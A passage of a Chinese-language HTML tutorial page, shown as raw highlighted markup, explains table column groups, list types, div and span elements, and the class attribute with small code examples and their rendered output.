punctuation">&lt;/</span>thead</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">50</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>February<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tfoot</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Sum<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$180<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tfoot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">  <thead style="color:green">    <tr>      <th>Month</th>      <th>Savings</th>    </tr>  </thead>  <tbody style="color:blue;height:50px">    <tr>      <td>January</td>      <td>$100</td>    </tr>    <tr>      <td>February</td>      <td>$80</td>    </tr>  </tbody>  <tfoot style="color:red">    <tr>      <td>Sum</td>      <td>$180</td>    </tr>  </tfoot></table><h3 id="列分组"><a href="#列分组" class="headerlink" title="列分组"></a>列分组</h3><p><code>col</code>标签为表格中一个或多个列定义属性值。</p><p><code>col</code> 元素是仅包含属性的空元素。如需创建列，您就必须在 <code>tr</code> 元素内部规定 <code>td</code> 元素。</p><p>例如为表格中的三个列规定了不同的对齐方式：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>ISBN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Price<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3476896<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>My first HTML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$53<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table width="100%" border="1">  <colgroup><col align="left">  <col align="left">  <col align="right">  </colgroup><tbody><tr>    <th>ISBN</th>    <th>Title</th>    <th>Price</th>  </tr>  <tr>    <td>3476896</td>    <td>My first HTML</td>    <td>$53</td>  </tr></tbody></table><p><em>（然而我用Firefox、Chrome、Edge都没有效果emmmm。</em></p><hr><p><code>colgroup</code> 标签用于对表格中的列进行组合，以便对其进行格式化。</p><p>如需对全部列应用样式，<code>&lt;colgroup&gt;</code>标签很有用，这样就不需要对各个单元和各行重复应用样式了。</p><p><code>&lt;colgroup&gt;</code> 标签只能在 <code>table</code> 元素中使用。</p><p>例如两个 colgroup 元素为表格中的三列规定了不同的对齐方式和样式（注意第一个 colgroup 元素横跨两列）：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">span</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#0000FF</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>ISBN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Price<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3476896<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>My first HTML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$53<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table width="100%" border="1">  <colgroup span="2" align="left"></colgroup>  <colgroup align="right" style="color:#0000FF;"></colgroup>  <tbody><tr>    <th>ISBN</th>    <th>Title</th>    <th>Price</th>  </tr>  <tr>    <td>3476896</td>    <td>My first HTML</td>    <td>$53</td>  </tr></tbody></table><p><em>（然而我这里还是没有效果emmm</em></p><br><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p><strong>Unordered list</strong></p><p><strong><em>（这里的样式也被全局的样式给冲掉了 emmm</em></strong></p><p>项目列表，项目默认使用粗体圆点（典型的小黑圆圈）进行标记。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>First item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>Next item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre><ul>    <li>First item</li>    <li>Next item</li></ul><p>可以定义不同的样式类型。</p><h4 id="disc-类型"><a href="#disc-类型" class="headerlink" title="disc 类型"></a>disc 类型</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>disc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  </code></pre><ul type="disc"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ul>  <h4 id="circle-类型"><a href="#circle-类型" class="headerlink" title="circle 类型"></a>circle 类型</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  </code></pre><ul type="circle"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ul>  <h4 id="square-类型"><a href="#square-类型" class="headerlink" title="square 类型"></a>square 类型</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>square<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  </code></pre><ul type="square"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ul>  <h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p><strong>Ordered list</strong></p><p>列表项目默认使用数字进行标记。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>First item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>Next item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span></code></pre><ol><li>First item</li><li>Next item</li></ol><p>有序列表也可以定义不同的样式</p><h4 id="数字列表"><a href="#数字列表" class="headerlink" title="数字列表"></a>数字列表</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>  </code></pre><ol type="1"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ol>  <h4 id="字母列表"><a href="#字母列表" class="headerlink" title="字母列表"></a>字母列表</h4><p>大写字母</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>A<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>  </code></pre><ol type="A"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ol>  <p>小写字母改成 <code>&lt;ol type="a"&gt;</code> 即可。</p><h4 id="罗马字母列表"><a href="#罗马字母列表" class="headerlink" title="罗马字母列表"></a>罗马字母列表</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>I<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柠檬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>桔子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>  </code></pre><ol type="I"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li> <li>桔子</li></ol>  <p>小写罗马字母则为 <code>&lt;ol type="i"&gt;</code> 。</p><ol type="i"> <li>苹果</li> <li>香蕉</li> <li>柠檬</li></ol><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><p><strong>Definition list</strong></p><p>自定义列表不仅仅是一列项目，而是项目及其注释的组合。</p><p>自定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code> 开始。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>First term<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Definition<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Next term<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Definition<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span></code></pre><dl>    <dt>First term</dt>    <dd>Definition</dd>    <dt>Next term</dt>    <dd>Definition</dd></dl><h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>咖啡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>茶        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>红茶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>绿茶                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>中国茶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>非洲茶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>牛奶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre><ul>    <li>咖啡</li>    <li>茶        <ul>            <li>红茶</li>            <li>绿茶                <ul>                    <li>中国茶</li>                    <li>非洲茶</li>                </ul>            </li>        </ul>    </li>    <li>牛奶</li></ul><br><h2 id="块"><a href="#块" class="headerlink" title="块"></a>块</h2><p>可以通过  <code>&lt;div&gt;</code>  和  <code>&lt;span&gt;</code> 将 HTML 元素组合起来。</p><p>大多数 HTML 元素被定义为<strong>块级元素</strong>或<strong>内联元素</strong>。“块级元素” <em>block level element</em>，“内联元素” <em>inline element</em>。</p><p><strong>块级元素</strong>在浏览器显示时，通常会以新行来开始（和结束）。</p><p><strong>内联元素</strong>在显示时通常不会以新行开始。</p><h3 id="div-元素"><a href="#div-元素" class="headerlink" title="div 元素"></a>div 元素</h3><p>division/section</p><p>可以说是最常用的<strong>块级元素</strong>8。可用于组合其他 HTML 元素的容器。</p><p>它没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。</p><p>如果与 CSS 一同使用，<code>&lt;div&gt;</code> 元素可用于<strong>对大的内容块设置样式属性</strong>。</p><p><code>&lt;div&gt;</code> 元素的另一个常见的用途是<strong>文档布局</strong>。</p><h3 id="span-元素"><a href="#span-元素" class="headerlink" title="span 元素"></a>span 元素</h3><p><strong>内联元素</strong>，可用作文本的容器。</p><p>也没有特定的含义。</p><p>也可以与 CSS 一同使用，来给部分文本定义样式属性。</p><br><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><code>class</code>属性</p><p>可以用来给同一类元素设置相同的样式。</p><p>设置 <code>&lt;div&gt;</code> 元素的类，使我们能够为相同的 <code>&lt;div&gt;</code> 元素设置相同的样式：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token selector"><span class="token class">.miaotest</span> </span><span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span>pink<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miaotest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miaotest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Paris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Paris is the capital and most populous city of France.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token 